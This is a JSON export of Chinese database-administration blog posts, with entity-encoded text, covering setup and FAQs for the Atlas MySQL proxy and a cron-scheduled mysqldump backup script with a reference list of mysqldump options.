0.8.2&#x7248;&#x672C;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;&#x5927;&#x91CF;bug&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x7279;&#x6027;&#x3002;&#x800C;&#x4E14;&#x5B89;&#x88C5;&#x65B9;&#x4FBF;&#x3002;&#x914D;&#x7F6E;&#x7684;&#x6CE8;&#x91CA;&#x5199;&#x7684;&#x86EE;&#x8BE6;&#x7EC6;&#x7684;&#xFF0C;&#x90FD;&#x662F;&#x4E2D;&#x6587;&#x3002; &#x4E3B;&#x8981;&#x529F;&#x80FD; &#x8BFB;&#x5199;&#x5206;&#x79BB; &#x4ECE;&#x5E93;&#x8D1F;&#x8F7D;&#x5747;&#x8861; IP&#x8FC7;&#x6EE4; &#x81EA;&#x52A8;&#x5206;&#x8868; DBA&#x53EF;&#x5E73;&#x6ED1;&#x4E0A;&#x4E0B;&#x7EBF;DB &#x81EA;&#x52A8;&#x6458;&#x9664;&#x5B95;&#x673A;&#x7684;DB &#x76F8;&#x5173;&#x94FE;&#x63A5;Mysql&#x4E2D;&#x95F4;&#x4EF6;&#x4EA7;&#x54C1;&#x6BD4;&#x8F83;&#xFF1A;http://songwie.com/articlelist/44Atlas&#x7684;&#x5B89;&#x88C5;&#xFF1A;https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x5B89;&#x88C5;Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQ&#xFF1A;https://github.com/Qihoo360/Atlas/wiki/Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQAtlas&#x6027;&#x80FD;&#x7279;&#x70B9;&#xFF1A;https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;Atlas&#x67B6;&#x6784;&#xFF1A;https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x67B6;&#x6784;Atlas+Keepalived&#xFF1A;http://sofar.blog.51cto.com/353572/1601552Atlas&#x5404;&#x9879;&#x529F;&#x80FD;&#x9A8C;&#x8BC1;&#xFF1A;http://blog.itpub.net/27000195/viewspace-1421262/ &#x5B98;&#x7F51;&#x6559;&#x7A0B;&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x4E14;&#x662F;&#x4E2D;&#x6587;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x76F8;&#x5173;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E86; &#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;1echo &quot;/usr/local/mysql-proxy/bin/mysql-proxyd test start&quot; &gt;&gt; /etc/rc.local &#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# &#x7F16;&#x5199;&#x7B80;&#x5355;&#x7684;Atlas&#x542F;&#x52A8;&#x811A;&#x672C;vim /etc/init.d/atlas#!/bin/sh start() { /usr/local/mysql-proxy/bin/mysql-proxyd test start} stop() { /usr/local/mysql-proxy/bin/mysql-proxyd test stop}status() { /usr/local/mysql-proxy/bin/mysql-proxyd test status }restart() { /usr/local/mysql-proxy/bin/mysql-proxyd test restart} ATLAS=&quot;/usr/local/mysql-proxy/bin/mysql-proxyd&quot; [ -f $ATLAS ] || exit 1 # See how we were called. case &quot;$1&quot; in start) start ;; stop) stop ;; restart) restart ;; status) status ;; # stop sleep 3 start ;; *) echo $&quot;Usage: $0 {start|stop|status|restart}&quot; exit 1 esac exit 0 # atlas&#x670D;&#x52A1;&#x9A8C;&#x8BC1;service atlas statusservice atlas startservice atlas restartservice atlas stop &#x67E5;&#x770B;MySQL&#x76D1;&#x542C;&#x7AEF;&#x53E3;1234etstat -tanlp | grep mysqltcp 0 0 0.0.0.0:2345 0.0.0.0:* LISTEN 21449/mysql-proxy tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 24096/mysqld tcp 0 0 0.0.0.0:1234 0.0.0.0:* LISTEN 21449/mysql-proxy Atlas&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D;12345# &#x5B89;&#x88C5;sudo rpm -i Atlas-2.2.1.el6.x86_64.rpm# &#x5378;&#x8F7D;sudo rpm -e Atlas-2.2.1.el6.x86_64 &#x95EE;&#x9898;&#x76F8;&#x5173;&#x95EE;&#x9898;&#xFF1A;atlas&#x5B89;&#x88C5;&#x540E;&#xFF0C;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8BFB;&#x4E00;&#x76F4;&#x8D70;&#x4E3B;&#x5E93; &#x56DE;&#x7B54;&#xFF1A;&#x6709;&#x4E8B;&#x52A1;&#x5B58;&#x5728;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F1A;&#x5F3A;&#x5236;&#x8D70;&#x4E3B;&#x5E93;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF0C;&#x6DFB;&#x52A0;&#x6CE8;&#x89E3;[@Transactional(propagation=Propagation.NOT_SUPPORTED)];&#x82E5;&#x4E0D;&#x6D89;&#x53CA;&#x4E8B;&#x52A1;&#xFF0C;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x5E93;&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x4E00;&#x81F4;&#xFF0C;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E3A;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF0C;&#x5E76;&#x6267;&#x884C;[FLUSH PRIVILEGES]&#x3002; &#x95EE;&#x9898;&#xFF1A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x81EA;&#x6D4B;&#x6210;&#x529F;&#xFF0C;java&#x7A0B;&#x5E8F;&#x8FDE;&#x63A5;Atlas&#x540E;&#x5374;&#x4E0D;&#x80FD;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x8BF7;&#x6C42;&#x90FD;&#x53D1;&#x5411;&#x4E3B;&#x5E93;&#xFF0C;&#x8FD9;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#xFF1F;&#x56DE;&#x7B54;&#xFF1A;&#x68C0;&#x67E5;&#x4E00;&#x4E0B;java&#x6846;&#x67B6;&#xFF0C;&#x662F;&#x4E0D;&#x662F;&#x9ED8;&#x8BA4;&#x5C06;autocommit&#x8BBE;&#x7F6E;&#x4E3A;0&#x4E86;&#xFF0C;&#x5F88;&#x591A;java&#x6846;&#x67B6;&#x5C06;&#x8BED;&#x53E5;&#x90FD;&#x5C01;&#x88C5;&#x5728;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x4E2D;&#xFF0C;&#x800C;Atlas&#x4F1A;&#x5C06;&#x4E8B;&#x52A1;&#x8BF7;&#x6C42;&#x90FD;&#x53D1;&#x5411;&#x4E3B;&#x5E93;&#x3002; &#x95EE;&#x9898;&#xFF1A;&#x6267;&#x884C;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#xFF0C;&#x6210;&#x529F;&#x4E0A;&#x4E0B;&#x7EBF;&#x4ECE;&#x5E93;DB&#x540E;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4ECE;&#x5E93;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x540C;&#x6B65;&#x4E3B;&#x5E93;&#x6570;&#x636E;&#x56DE;&#x7B54;&#xFF1A;atlas&#x662F;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x53EA;&#x662F;&#x63D0;&#x4F9B;&#x4E86;&#x8BBF;&#x95EE;&#x5C42;&#x7684;&#x4EE3;&#x7406;&#xFF0C;&#x4EE3;&#x7406;&#x548C;&#x4E3B;&#x4ECE;&#x6CA1;&#x6709;&#x5173;&#x7CFB;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E3B;&#x4ECE;&#x8FD8;&#x9700;&#x81EA;&#x5DF1;&#x914D;&#x7F6E;&#x3002;&#x800C;&#x4E0A;&#x4E0B;&#x7EBF;&#x4ECE;&#x5E93;DB&#xFF0C;&#x53EA;&#x662F;&#x8BF4;&#x8BFB;&#x7684;&#x8BF7;&#x6C42;&#x4E0D;&#x518D;&#x53D1;&#x5F80;&#x76F8;&#x5E94;&#x7684;&#x4ECE;&#x5E93;&#x4E86;&#xFF0C;&#x4E8B;&#x5148;&#x914D;&#x7F6E;&#x7684;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;&#x5E76;&#x4E0D;&#x4F1A;&#x6539;&#x53D8;&#x3002;&#x8FD8;&#x6709;&#x76EE;&#x524D;&#x7684;atlas&#x6682;&#x4E0D;&#x652F;&#x6301;&#x591A;&#x4E3B;&#x6A21;&#x5F0F;&#x3002; &#x95EE;&#x9898;&#xFF1A;Atlas&#x78B0;&#x5230;&#x89E3;&#x51B3;&#x4E0D;&#x4E86;&#x7684;&#x95EE;&#x9898;&#x600E;&#x4E48;&#x529E;&#xFF1F;&#x56DE;&#x7B54;&#xFF1A;&#x5C06;&#x76F8;&#x5173;&#x73AF;&#x5883;&#x3001;&#x6B65;&#x9AA4;&#x548C;&#x8FD0;&#x884C;&#x622A;&#x56FE;&#x53D1;&#x90AE;&#x4EF6;&#x81F3;zhuchao[AT]360.cn&#xFF0C;&#x6216;&#x8005;&#x52A0;QQ&#x7FA4;326544838&#x3002;&#x6211;&#x4E00;&#x95EE;&#x9898;&#x7EA0;&#x7ED3;&#x4E86;&#x51E0;&#x5C0F;&#x65F6;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#x4E86;&#xFF0C;&#x4E09;&#x5206;&#x949F;&#x540E;&#x5C31;&#x56DE;&#x590D;&#x6211;&#x4E86;&#xFF0C;&#x9707;&#x60CA;&#x4E86; (&#xAF;&#xFE43;&#xAF;) &#x66F4;&#x65B0;&#x4E2D;&#x3002;&#x3002;&#x3002;","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"},{"name":"atlas","slug":"atlas","permalink":"http://www.wangxin123.com/tags/atlas/"}]},{"title":"MySQL定时逻辑备份","slug":"MySQL定时逻辑备份","date":"2016-10-15T14:22:00.000Z","updated":"2017-02-09T06:47:02.532Z","comments":true,"path":"2016/10/15/MySQL定时逻辑备份/","link":"","permalink":"http://www.wangxin123.com/2016/10/15/MySQL定时逻辑备份/","excerpt":"cron&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;cron&#x662F;&#x4E00;&#x4E2A;linux&#x4E0B;&#x7684;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x65E0;&#x9700;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8FD0;&#x884C;&#x4F5C;&#x4E1A;&#x3002;Linux&#x4E0B;&#x7684;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x4FBF;&#x662F;&#x5728;crontab&#x6587;&#x4EF6;&#x4E2D;&#x52A0;&#x5165;&#x5B9A;&#x5236;&#x8BA1;&#x5212;&#x6765;&#x6267;&#x884C;&#x3002; 12345678910111213141516171819202122# vim /etc/crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed0 3 * * * root sh /data/mysqlbackup/all-databases-backup.sh# run-parts01 * * * * root run-parts /etc/cron.hourly //&#x6BCF;&#x5C0F;&#x65F6;&#x6267;&#x884C;/etc/cron.hourly&#x5185;&#x7684;&#x811A;&#x672C;02 4 * * * root run-parts /etc/cron.daily //&#x6BCF;&#x5929;&#x6267;&#x884C;/etc/cron.daily&#x5185;&#x7684;&#x811A;&#x672C;22 4 * * 0 root run-parts /etc/cron.weekly //&#x6BCF;&#x661F;&#x671F;&#x6267;&#x884C;/etc/cron.weekly&#x5185;&#x7684;&#x811A;&#x672C;42 4 1 * * root run-parts /etc/cron.monthly //&#x6BCF;&#x6708;&#x53BB;&#x6267;&#x884C;/etc/cron.monthly&#x5185;&#x7684;&#x811A;&#x672C;","keywords":null,"text":"cron&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;cron&#x662F;&#x4E00;&#x4E2A;linux&#x4E0B;&#x7684;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x65E0;&#x9700;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8FD0;&#x884C;&#x4F5C;&#x4E1A;&#x3002;Linux&#x4E0B;&#x7684;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x4FBF;&#x662F;&#x5728;crontab&#x6587;&#x4EF6;&#x4E2D;&#x52A0;&#x5165;&#x5B9A;&#x5236;&#x8BA1;&#x5212;&#x6765;&#x6267;&#x884C;&#x3002; 12345678910111213141516171819202122# vim /etc/crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed0 3 * * * root sh /data/mysqlbackup/all-databases-backup.sh# run-parts01 * * * * root run-parts /etc/cron.hourly //&#x6BCF;&#x5C0F;&#x65F6;&#x6267;&#x884C;/etc/cron.hourly&#x5185;&#x7684;&#x811A;&#x672C;02 4 * * * root run-parts /etc/cron.daily //&#x6BCF;&#x5929;&#x6267;&#x884C;/etc/cron.daily&#x5185;&#x7684;&#x811A;&#x672C;22 4 * * 0 root run-parts /etc/cron.weekly //&#x6BCF;&#x661F;&#x671F;&#x6267;&#x884C;/etc/cron.weekly&#x5185;&#x7684;&#x811A;&#x672C;42 4 1 * * root run-parts /etc/cron.monthly //&#x6BCF;&#x6708;&#x53BB;&#x6267;&#x884C;/etc/cron.monthly&#x5185;&#x7684;&#x811A;&#x672C; &#x524D;&#x56DB;&#x884C;&#x662F;&#x6709;&#x5173;&#x8BBE;&#x7F6E;cron&#x4EFB;&#x52A1;&#x8FD0;&#x884C;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;SHELL&#xFF1A;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;&#x7684;SHELL&#x73AF;&#x5883;(&#x8BE5;&#x6837;&#x4F8B;&#x4E3A;bash shell)&#x3002;PATH&#xFF1A;&#x5B9A;&#x4E49;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x8DEF;&#x5F84;&#x3002;MAILTO&#xFF1A;cron&#x7684;&#x8F93;&#x51FA;&#x4EE5;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x7684;&#x5F62;&#x5F0F;&#x53D1;&#x7ED9;MAILTO&#x53D8;&#x91CF;&#x5B9A;&#x4E49;&#x7684;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x5982;&#x679C;&#x5B9A;&#x4E49;&#x4E3A;&#x7A7A;(MAILTO=&#x201D;&#x201D;)&#xFF0C;&#x90AE;&#x4EF6;&#x4E0D;&#x4F1A;&#x53D1;&#x9001;&#x3002;HOME&#xFF1A;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x6216;&#x811A;&#x672C;&#x65F6;&#xFF0C;HOME&#x53D8;&#x91CF;&#x53EF;&#x7528;&#x6765;&#x8BBE;&#x7F6E;&#x57FA;&#x76EE;&#x5F55;&#x3002; minute&#xFF1A;&#x4ECE;0&#x5230;59&#x7684;&#x6574;&#x6570;hour&#xFF1A;&#x4ECE;0&#x5230;23&#x7684;&#x6574;&#x6570;day&#xFF1A;&#x4ECE;1&#x5230;31&#x7684;&#x6574;&#x6570; (&#x5FC5;&#x987B;&#x662F;&#x6307;&#x5B9A;&#x6708;&#x4EFD;&#x7684;&#x6709;&#x6548;&#x65E5;&#x671F;)month&#xFF1A;&#x4ECE;1&#x5230;12&#x7684;&#x6574;&#x6570; (&#x6216;&#x5982;Jan&#x6216;Feb&#x7B80;&#x5199;&#x7684;&#x6708;&#x4EFD;)dayofweek&#xFF1A;&#x4ECE;0&#x5230;7&#x7684;&#x6574;&#x6570;&#xFF0C;0&#x6216;7&#x7528;&#x6765;&#x63CF;&#x8FF0;&#x5468;&#x65E5; (&#x6216;&#x7528;Sun&#x6216;Mon&#x7B80;&#x5199;&#x6765;&#x8868;&#x793A;)command&#xFF1A;&#x9700;&#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;(&#x53EF;&#x7528;as ls /proc &gt;&gt; /tmp/proc&#x6216; &#x6267;&#x884C;&#x81EA;&#x5B9A;&#x4E49;&#x811A;&#x672C;&#x7684;&#x547D;&#x4EE4;) &#x5927;&#x5BB6;&#x6CE8;&#x610F;&#x201D;run-parts&#x201D;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x4E86;&#xFF0C;&#x5982;&#x679C;&#x53BB;&#x6389;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x8BDD;&#xFF0C;&#x540E;&#x9762;&#x5C31;&#x53EF;&#x4EE5;&#x5199;&#x8981;&#x8FD0;&#x884C;&#x7684;&#x67D0;&#x4E2A;&#x811A;&#x672C;&#x540D;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6587;&#x4EF6;&#x5939;&#x540D;&#x4E86;&#x3002; &#x903B;&#x8F91;&#x5907;&#x4EFD;&#x811A;&#x672C;&#x8303;&#x4F8B;123456789101112131415161718192021222324252627282930# vim /data/mysqlbackup/all-databases-backup.sh#!/bin/sh# &#x7528;&#x6765;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;mysql_user=rootmysql_pwd=pwd# &#x5168;&#x91CF;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x540D;&#x79F0;JIRA_FILE_NAME=all-`date +%Y%m%d%H%M%S`;# &#x6570;&#x636E;&#x5907;&#x4EFD;&#x76EE;&#x5F55;backupDir=/data/mysqlbackup/# &#x5982;&#x679C;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E0D;&#x5B58;&#x5728;&#x5219;&#x521B;&#x5EFA;&#x5B83;if [[ ! -e $backupDir ]];then mkdir $backupDirfi# &#x5168;&#x5E93;&#x5907;&#x4EFD;cd $backupDir/usr/bin/mysqldump -u$mysql_user -p$mysql_pwd --all-databases &gt; ${JIRA_FILE_NAME}.sql# &#x538B;&#x7F29;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x5220;&#x9664;sqltar -zcvf ${JIRA_FILE_NAME}.sql.tar.gz ${JIRA_FILE_NAME}.sqlrm -rf ${JIRA_FILE_NAME}.sql# &#x4FDD;&#x7559;10&#x5929;&#x6570;&#x636E;remove_file_day=`date --date=&apos;10 days ago&apos; +%Y%m%d`rm -f all-$remove_file_day* mysqldump&#x53C2;&#x6570;&#x8BE6;&#x89E3;http://doc.mysql.cn/mysql5/refman-5.1-zh.html-chapter/client-side-scripts.html#mysqldump 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320--all-databases , -A&#x5BFC;&#x51FA;&#x5168;&#x90E8;&#x6570;&#x636E;&#x5E93;&#x3002;mysqldump -uroot -p --all-databases--all-tablespaces , -Y&#x5BFC;&#x51FA;&#x5168;&#x90E8;&#x8868;&#x7A7A;&#x95F4;&#x3002;mysqldump -uroot -p --all-databases --all-tablespaces--no-tablespaces , -y&#x4E0D;&#x5BFC;&#x51FA;&#x4EFB;&#x4F55;&#x8868;&#x7A7A;&#x95F4;&#x4FE1;&#x606F;&#x3002;mysqldump -uroot -p --all-databases --no-tablespaces--add-drop-database&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x521B;&#x5EFA;&#x4E4B;&#x524D;&#x6DFB;&#x52A0;drop&#x6570;&#x636E;&#x5E93;&#x8BED;&#x53E5;&#x3002;mysqldump -uroot -p --all-databases --add-drop-database--add-drop-table&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x8868;&#x521B;&#x5EFA;&#x4E4B;&#x524D;&#x6DFB;&#x52A0;drop&#x6570;&#x636E;&#x8868;&#x8BED;&#x53E5;&#x3002;(&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;&#xFF0C;&#x4F7F;&#x7528;--skip-add-drop-table&#x53D6;&#x6D88;&#x9009;&#x9879;)mysqldump -uroot -p --all-databases (&#x9ED8;&#x8BA4;&#x6DFB;&#x52A0;drop&#x8BED;&#x53E5;)mysqldump -uroot -p --all-databases &#x2013;skip-add-drop-table (&#x53D6;&#x6D88;drop&#x8BED;&#x53E5;)--add-locks&#x5728;&#x6BCF;&#x4E2A;&#x8868;&#x5BFC;&#x51FA;&#x4E4B;&#x524D;&#x589E;&#x52A0;LOCK TABLES&#x5E76;&#x4E14;&#x4E4B;&#x540E;UNLOCK TABLE&#x3002;(&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;&#xFF0C;&#x4F7F;&#x7528;--skip-add-locks&#x53D6;&#x6D88;&#x9009;&#x9879;)mysqldump -uroot -p --all-databases (&#x9ED8;&#x8BA4;&#x6DFB;&#x52A0;LOCK&#x8BED;&#x53E5;)mysqldump -uroot -p --all-databases &#x2013;skip-add-locks (&#x53D6;&#x6D88;LOCK&#x8BED;&#x53E5;)--allow-keywords&#x5141;&#x8BB8;&#x521B;&#x5EFA;&#x662F;&#x5173;&#x952E;&#x8BCD;&#x7684;&#x5217;&#x540D;&#x5B57;&#x3002;&#x8FD9;&#x7531;&#x8868;&#x540D;&#x524D;&#x7F00;&#x4E8E;&#x6BCF;&#x4E2A;&#x5217;&#x540D;&#x505A;&#x5230;&#x3002;mysqldump -uroot -p --all-databases --allow-keywords--apply-slave-statements&#x5728;&apos;CHANGE MASTER&apos;&#x524D;&#x6DFB;&#x52A0;&apos;STOP SLAVE&apos;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x5BFC;&#x51FA;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;&apos;START SLAVE&apos;&#x3002;mysqldump -uroot -p --all-databases --apply-slave-statements--character-sets-dir&#x5B57;&#x7B26;&#x96C6;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;mysqldump -uroot -p --all-databases --character-sets-dir=/usr/local/mysql/share/mysql/charsets--comments&#x9644;&#x52A0;&#x6CE8;&#x91CA;&#x4FE1;&#x606F;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;--skip-comments&#x53D6;&#x6D88;mysqldump -uroot -p --all-databases (&#x9ED8;&#x8BA4;&#x8BB0;&#x5F55;&#x6CE8;&#x91CA;)mysqldump -uroot -p --all-databases --skip-comments (&#x53D6;&#x6D88;&#x6CE8;&#x91CA;)--compatible&#x5BFC;&#x51FA;&#x7684;&#x6570;&#x636E;&#x5C06;&#x548C;&#x5176;&#x5B83;&#x6570;&#x636E;&#x5E93;&#x6216;&#x65E7;&#x7248;&#x672C;&#x7684;MySQL &#x76F8;&#x517C;&#x5BB9;&#x3002;&#x503C;&#x53EF;&#x4EE5;&#x4E3A;ansi&#x3001;mysql323&#x3001;mysql40&#x3001;postgresql&#x3001;oracle&#x3001;mssql&#x3001;db2&#x3001;maxdb&#x3001;no_key_options&#x3001;no_tables_options&#x3001;no_field_options&#x7B49;&#xFF0C;&#x8981;&#x4F7F;&#x7528;&#x51E0;&#x4E2A;&#x503C;&#xFF0C;&#x7528;&#x9017;&#x53F7;&#x5C06;&#x5B83;&#x4EEC;&#x9694;&#x5F00;&#x3002;&#x5B83;&#x5E76;&#x4E0D;&#x4FDD;&#x8BC1;&#x80FD;&#x5B8C;&#x5168;&#x517C;&#x5BB9;&#xFF0C;&#x800C;&#x662F;&#x5C3D;&#x91CF;&#x517C;&#x5BB9;&#x3002;mysqldump -uroot -p --all-databases --compatible=ansi--compact&#x5BFC;&#x51FA;&#x66F4;&#x5C11;&#x7684;&#x8F93;&#x51FA;&#x4FE1;&#x606F;(&#x7528;&#x4E8E;&#x8C03;&#x8BD5;)&#x3002;&#x53BB;&#x6389;&#x6CE8;&#x91CA;&#x548C;&#x5934;&#x5C3E;&#x7B49;&#x7ED3;&#x6784;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x9009;&#x9879;&#xFF1A;--skip-add-drop-table --skip-add-locks --skip-comments --skip-disable-keysmysqldump -uroot -p --all-databases --compact--complete-insert, -c&#x4F7F;&#x7528;&#x5B8C;&#x6574;&#x7684;insert&#x8BED;&#x53E5;(&#x5305;&#x542B;&#x5217;&#x540D;&#x79F0;)&#x3002;&#x8FD9;&#x4E48;&#x505A;&#x80FD;&#x63D0;&#x9AD8;&#x63D2;&#x5165;&#x6548;&#x7387;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x80FD;&#x4F1A;&#x53D7;&#x5230;max_allowed_packet&#x53C2;&#x6570;&#x7684;&#x5F71;&#x54CD;&#x800C;&#x5BFC;&#x81F4;&#x63D2;&#x5165;&#x5931;&#x8D25;&#x3002;mysqldump -uroot -p --all-databases --complete-insert--compress, -C&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x542F;&#x7528;&#x538B;&#x7F29;&#x4F20;&#x9012;&#x6240;&#x6709;&#x4FE1;&#x606F;mysqldump -uroot -p --all-databases --compress--create-options, -a&#x5728;CREATE TABLE&#x8BED;&#x53E5;&#x4E2D;&#x5305;&#x62EC;&#x6240;&#x6709;MySQL&#x7279;&#x6027;&#x9009;&#x9879;&#x3002;(&#x9ED8;&#x8BA4;&#x4E3A;&#x6253;&#x5F00;&#x72B6;&#x6001;)mysqldump -uroot -p --all-databases--databases, -B&#x5BFC;&#x51FA;&#x51E0;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x3002;&#x53C2;&#x6570;&#x540E;&#x9762;&#x6240;&#x6709;&#x540D;&#x5B57;&#x53C2;&#x91CF;&#x90FD;&#x88AB;&#x770B;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x540D;&#x3002;mysqldump -uroot -p --databases test mysql--debug&#x8F93;&#x51FA;debug&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x4E8E;&#x8C03;&#x8BD5;&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#xFF1A;d:t:o,/tmp/mysqldump.tracemysqldump -uroot -p --all-databases --debugmysqldump -uroot -p --all-databases --debug=&#x201D; d:t:o,/tmp/debug.trace&#x201D;--debug-check&#x68C0;&#x67E5;&#x5185;&#x5B58;&#x548C;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x4F7F;&#x7528;&#x8BF4;&#x660E;&#x5E76;&#x9000;&#x51FA;&#x3002;mysqldump -uroot -p --all-databases --debug-check--debug-info&#x8F93;&#x51FA;&#x8C03;&#x8BD5;&#x4FE1;&#x606F;&#x5E76;&#x9000;&#x51FA;mysqldump -uroot -p --all-databases --debug-info--default-character-set&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;utf8mysqldump -uroot -p --all-databases --default-character-set=latin1--delayed-insert&#x91C7;&#x7528;&#x5EF6;&#x65F6;&#x63D2;&#x5165;&#x65B9;&#x5F0F;&#xFF08;INSERT DELAYED&#xFF09;&#x5BFC;&#x51FA;&#x6570;&#x636E;mysqldump -uroot -p --all-databases --delayed-insert--delete-master-logsmaster&#x5907;&#x4EFD;&#x540E;&#x5220;&#x9664;&#x65E5;&#x5FD7;. &#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x5C06;&#x81EA;&#x52A8;&#x6FC0;&#x6D3B;--master-data&#x3002;mysqldump -uroot -p --all-databases --delete-master-logs--disable-keys&#x5BF9;&#x4E8E;&#x6BCF;&#x4E2A;&#x8868;&#xFF0C;&#x7528;/*!40000 ALTER TABLE tbl_name DISABLE KEYS */;&#x548C;/*!40000 